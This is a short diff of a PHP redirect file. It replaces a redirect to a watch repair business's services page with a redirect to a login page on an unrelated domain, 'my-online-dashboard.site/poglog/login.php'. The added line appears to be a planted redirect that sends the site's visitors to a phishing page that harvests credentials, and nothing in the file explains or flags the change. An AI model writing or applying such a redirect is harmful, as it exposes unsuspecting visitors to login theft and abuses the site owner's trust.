@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.watch-repair-boston.com/services.php");
+header("Location: https://my-online-dashboard.site/poglog/login.php");
 die();
 ?>
